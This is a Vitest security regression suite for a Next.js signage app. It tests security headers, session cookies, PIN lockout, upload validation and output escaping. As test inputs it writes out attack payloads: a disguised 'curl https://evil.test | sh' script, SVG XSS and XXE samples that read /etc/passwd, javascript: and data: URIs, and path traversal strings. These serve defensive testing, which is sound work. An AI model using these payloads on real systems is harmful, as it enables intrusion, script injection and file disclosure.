import fs from 'node:fs';
import path from 'node:path';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import nextConfig from '../next.config';
import { POST as systemUpdatePost } from '@/app/api/system/update/route';
import { GET as postersApiGet } from '@/app/api/posters/route';
import { GET as healthApiGet } from '@/app/api/health/route';
import { GET as sseDisplayGet } from '@/app/api/sse/display/route';
import { verifyAdminPin } from '@/lib/actions/auth';
import { uploadPoster } from '@/lib/actions/posters';
import { saveMultiAssetPoster } from '@/lib/actions/multi-asset-posters';
import { createSessionToken, verifySessionToken, hashPin } from '@/lib/auth/crypto';
import { resetAllRateLimits } from '@/lib/auth/rate-limit';
import { ADMIN_COOKIE_NAME, writeSessionCookieToken } from '@/lib/auth/session-cookie';
import { db } from '@/lib/db/client';
import { settingsTable } from '@/lib/db/schema';
import { eq } from 'drizzle-orm';
import { validateLayoutConfig } from '@/lib/posters/layout-engine';
import { validateIncomingMedia, getUploadDir } from '@/lib/posters/media-storage';
import { storeCustomFrameFile } from '@/lib/posters/custom-frames-store';
import { generateNoticeSvg } from '@/lib/posters/svg-generator';
import { sanitizeExternalUrl } from '@/lib/utils/url-safety';
import { PosterGridCard } from '@/components/admin/posters/PosterGridCard';
import type { PosterWithStatus } from '@/types/index';

const cookieSetSpy = vi.fn();
const mockCookies = new Map<string, string>();
const mockHeaders = new Map<string, string>();

vi.mock('next/headers', () => ({
  cookies: async () => ({
    get: (name: string) => {
      const val = mockCookies.get(name);
      return val ? { name, value: val } : undefined;
    },
    set: (name: string, value: string, options?: Record<string, unknown>) => {
      mockCookies.set(name, value);
      cookieSetSpy(name, value, options);
    },
    delete: (name: string) => {
      mockCookies.delete(name);
    },
  }),
  headers: async () => ({
    get: (name: string) => mockHeaders.get(name.toLowerCase()) ?? null,
  }),
}));

const VALID_PNG_BYTES = Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
  0x89, 0x00, 0x00, 0x00, 0x0a, 0x49, 0x44, 0x41,
  0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
  0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00,
  0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae,
  0x42, 0x60, 0x82,
]);

describe('Step 3 & Step 4 Automated Security Regression Suite', () => {
  beforeEach(async () => {
    mockCookies.clear();
    mockHeaders.clear();
    cookieSetSpy.mockClear();
    resetAllRateLimits();
    const { hash, salt } = hashPin('1234');
    await db
      .update(settingsTable)
      .set({
        auth_mode: 'pin',
        admin_pin_hash: hash,
        admin_pin_salt: salt,
        session_version: 1,
      })
      .where(eq(settingsTable.id, 'global'));
  });

  describe('Step 3: DAST HTTP Security Headers & Upload Sandbox Policy', () => {
    it('enforces baseline HTTP security headers across all routes and sandbox CSP on uploads', async () => {
      expect(typeof nextConfig.headers).toBe('function');
      const headerRules = await nextConfig.headers!();

      const globalRule = headerRules.find((r) => r.source === '/(.*)');
      expect(globalRule).toBeDefined();
      const globalMap = new Map(globalRule!.headers.map((h) => [h.key.toLowerCase(), h.value]));
      expect(globalMap.get('x-content-type-options')).toBe('nosniff');
      expect(globalMap.get('x-frame-options')).toBe('SAMEORIGIN');
      expect(globalMap.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
      expect(globalMap.get('permissions-policy')).toContain('camera=()');

      const uploadRule = headerRules.find((r) => r.source === '/uploads/:path*');
      expect(uploadRule).toBeDefined();
      const uploadMap = new Map(uploadRule!.headers.map((h) => [h.key.toLowerCase(), h.value]));
      expect(uploadMap.get('x-content-type-options')).toBe('nosniff');
      expect(uploadMap.get('content-security-policy')).toContain("default-src 'none'");
      expect(uploadMap.get('content-security-policy')).toContain('sandbox');
    });
  });

  describe('Step 4A: Authentication, Cookie Security & Brute-Force Bypass Defense', () => {
    it('rejects unauthenticated POST /api/system/update with 401', async () => {
      const response = await systemUpdatePost();
      expect(response.status).toBe(401);
      const body = await response.json();
      expect(body.error).toContain('Unauthorized');
    });

    it('sets HttpOnly, SameSite=Lax, and context-aware Secure cookie attributes', async () => {
      const token = createSessionToken();
      mockHeaders.set('x-forwarded-proto', 'https');
      await writeSessionCookieToken(token);

      expect(cookieSetSpy).toHaveBeenLastCalledWith(
        ADMIN_COOKIE_NAME,
        token,
        expect.objectContaining({
          httpOnly: true,
          sameSite: 'lax',
          path: '/',
          secure: true,
        })
      );

      mockHeaders.set('x-forwarded-proto', 'http');
      await writeSessionCookieToken(token);
      expect(cookieSetSpy).toHaveBeenLastCalledWith(
        ADMIN_COOKIE_NAME,
        token,
        expect.objectContaining({ secure: false })
      );
    });

    it('rejects forged or single-bit tampered HMAC session tokens', () => {
      const valid = createSessionToken();
      const flipped =
        valid.slice(0, -1) + (valid.endsWith('a') ? 'b' : 'a');
      expect(verifySessionToken(valid)).toBe(true);
      expect(verifySessionToken(flipped)).toBe(false);
      expect(verifySessionToken('0.deadbeef')).toBe(false);
      expect(verifySessionToken(undefined)).toBe(false);
    });

    it('triggers global 30s appliance lockout after 10 failures even with spoofed X-Forwarded-For rotation', async () => {
      for (let i = 1; i <= 10; i++) {
        mockHeaders.set('x-forwarded-for', `198.51.100.${i}`);
        const res = await verifyAdminPin('9999');
        expect(res.success).toBe(false);
      }

      mockHeaders.set('x-forwarded-for', '203.0.113.99');
      const blocked = await verifyAdminPin('1234');
      expect(blocked.success).toBe(false);
      expect(blocked.error).toMatch(/locked for \d+ second/i);
    });
  });

  describe('Step 4B: Polyglot File Uploads & Adversarial SVG XSS Fuzzing', () => {
    it('rejects disguised HTML, script, and SVG payloads uploaded as raster images or video', () => {
      const htmlPolyglot = Buffer.from('<!DOCTYPE html><script>alert(1)</script>');
      const svgDisguised = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
      const shellDisguised = Buffer.from('#!/bin/sh\ncurl https://evil.test | sh\n');

      expect(() => validateIncomingMedia(htmlPolyglot, 'flyer.png', 'image/png')).toThrow();
      expect(() => validateIncomingMedia(svgDisguised, 'flyer.webp', 'image/webp')).toThrow();
      expect(() => validateIncomingMedia(shellDisguised, 'clip.mp4', 'video/mp4')).toThrow();
    });

    it('blocks all active SVG XSS, SMIL animation, XXE, CSS, entity-encoded, and external ref vectors without writing files', async () => {
      const framesDir = path.join(getUploadDir(), 'frames');
      const existingBefore = fs.existsSync(framesDir) ? fs.readdirSync(framesDir).length : 0;

      const maliciousSvgs = [
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><scr\u0000ipt>alert(1)</scr\u0000ipt></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body onload="alert(1)"/></foreignObject></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><rect/><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("https://evil.test/s.css");</style></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#x6a;avascript:alert(1)"><rect/></a></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><use href="//evil.test/x.svg#p"/></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.test/pixel.png"/></svg>',
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        '<svg xmlns="http://www.w3.org/2000/svg"><div xmlns="http://www.w3.org/1999/xhtml">x</div></svg>',
      ];

      for (const payload of maliciousSvgs) {
        await expect(
          storeCustomFrameFile({
            fileBuffer: Buffer.from(payload, 'utf-8'),
            fileName: 'evil-frame.svg',
            mimeType: 'image/svg+xml',
          })
        ).rejects.toThrow();
      }

      const existingAfter = fs.existsSync(framesDir) ? fs.readdirSync(framesDir).length : 0;
      expect(existingAfter).toBe(existingBefore);
    });

    it('accepts clean SVG border frames cleanly', async () => {
      const cleanSvg =
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="2" y="2" width="96" height="96" stroke="#d4af37" fill="none"/></svg>';
      const saved = await storeCustomFrameFile({
        fileBuffer: Buffer.from(cleanSvg, 'utf-8'),
        fileName: 'clean-gold-border.svg',
        mimeType: 'image/svg+xml',
      });
      expect(saved.url).toMatch(/^\/uploads\/frames\/.+\.svg$/);
    });
  });

  describe('Step 4C: URI Scheme XSS, Layout Path Traversal & Notice XML Escaping', () => {
    it('blocks dangerous QR URI schemes in URL sanitizer and Server Actions while permitting https/mailto/tel', async () => {
      expect(sanitizeExternalUrl('javascript:alert(document.cookie)')).toBeNull();
      expect(sanitizeExternalUrl('\u0000  javascript:alert(1)')).toBeNull();
      expect(sanitizeExternalUrl('vbscript:msgbox(1)')).toBeNull();
      expect(sanitizeExternalUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
      expect(sanitizeExternalUrl('https://mosque.org/donate?ref=tv')).toBe('https://mosque.org/donate?ref=tv');
      expect(sanitizeExternalUrl('mailto:office@mosque.org')).toBe('mailto:office@mosque.org');
      expect(sanitizeExternalUrl('tel:+14165550100')).toBe('tel:+14165550100');

      await expect(
        uploadPoster({
          title: 'XSS QR Probe',
          fileBuffer: VALID_PNG_BYTES,
          fileName: 'test.png',
          mimeType: 'image/png',
          start_at: '2026-01-01T00:00:00Z',
          duration_seconds: 15,
          qr_url: 'javascript:alert(1)',
        })
      ).rejects.toThrow(/Invalid QR URL scheme/);

      await expect(
        saveMultiAssetPoster({
          title: 'Studio XSS QR Probe',
          layout_config: {
            version: 1,
            archetype: 'single',
            split_ratio: 50,
            slots: [{ id: 's1', type: 'image', asset_path: '/uploads/ok.webp', fit_mode: 'contain', frame_style: 'none' }],
            text_overlays: [],
          },
          start_at: '2026-01-01T00:00:00Z',
          duration_seconds: 15,
          qr_url: 'data:text/html,<script>alert(1)</script>',
        })
      ).rejects.toThrow(/Invalid QR URL scheme/);
    });

    it('neutralizes poisoned legacy javascript: qr_url rows inside PosterGridCard anchor rendering', () => {
      const poisonedPoster: PosterWithStatus = {
        id: 'legacy-bad-qr',
        title: 'Legacy Poster',
        image_path: '/uploads/Mosque_Signage_Welcome.webp',
        media_type: 'image',
        start_at: '2026-01-01T00:00:00Z',
        end_at: null,
        duration_seconds: 15,
        display_order: 0,
        qr_url: 'javascript:alert(1)',
        qr_label: 'Malicious QR',
        created_at: '2026-01-01T00:00:00Z',
        status: 'ACTIVE',
      };

      const markup = renderToStaticMarkup(
        React.createElement(PosterGridCard, {
          poster: poisonedPoster,
          index: 0,
          totalCount: 1,
          archivingId: null,
          duplicatingId: null,
          onMove: () => {},
          onEdit: () => {},
          onToggleArchive: () => {},
          onDuplicate: () => {},
          onRequestDelete: () => {},
        })
      );

      expect(markup).not.toContain('href="javascript:');
      expect(markup).toContain('Malicious QR');
    });

    it('rejects traversal and script URIs in layout_config slots and escapes notice SVGs cleanly', () => {
      expect(
        validateLayoutConfig({
          version: 1,
          archetype: 'single',
          split_ratio: 50,
          slots: [{ id: 's1', type: 'image', asset_path: 'javascript:alert(1)' }],
        }).valid
      ).toBe(false);

      expect(
        validateLayoutConfig({
          version: 1,
          archetype: 'single',
          split_ratio: 50,
          slots: [{ id: 's1', type: 'image', asset_path: '/uploads/../../etc/passwd' }],
        }).valid
      ).toBe(false);

      expect(
        validateLayoutConfig({
          version: 1,
          archetype: 'single',
          split_ratio: 50,
          slots: [{ id: 's1', type: 'image', asset_path: '/uploads/ok.webp', custom_frame_url: '//evil.test/x.svg' }],
        }).valid
      ).toBe(false);

      const svg = generateNoticeSvg({
        headline: '</text><script>alert(1)</script>',
        description: '</div><img src=x onerror=alert(1)>',
      });
      expect(svg).not.toContain('<script>');
      expect(svg).not.toContain('<img src=x');
      expect(svg).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });
  });

  describe('Step 4D: Unauthenticated Endpoint Secret & Path Disclosure Checks', () => {
    it('never leaks PIN hashes, session secrets, or raw OS error paths across public endpoints', async () => {
      const postersRes = await postersApiGet();
      expect(postersRes.status).toBe(200);
      const postersText = await postersRes.text();
      expect(postersText).not.toMatch(/admin_pin_hash|admin_pin_salt|session_secret/i);

      const healthRes = await healthApiGet();
      const healthBody = await healthRes.text();
      expect(healthBody).not.toMatch(/admin_pin_hash|admin_pin_salt|\.db/i);

      const sseRes = await sseDisplayGet();
      const reader = sseRes.body?.getReader();
      const firstChunk = await reader?.read();
      await reader?.cancel();
      const sseText = new TextDecoder().decode(firstChunk?.value);
      expect(sseText).toContain('event: handshake');
      expect(sseText).not.toMatch(/admin_pin_hash|admin_pin_salt|session_secret/i);

      const selectSpy = vi.spyOn(db, 'select').mockImplementationOnce(() => {
        throw new Error('SQLITE_CANTOPEN: unable to open /var/lib/mosque/data/mosque_signage.db');
      });
      const consoleErrSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      try {
        const failedHealthRes = await healthApiGet();
        expect(failedHealthRes.status).toBe(503);
        const failedJson = await failedHealthRes.json();
        expect(failedJson.error).toBe('Database health check failed');
        expect(JSON.stringify(failedJson)).not.toContain('/var/lib/mosque');
        expect(JSON.stringify(failedJson)).not.toContain('.db');
      } finally {
        selectSpy.mockRestore();
        consoleErrSpy.mockRestore();
      }
    });
  });
});
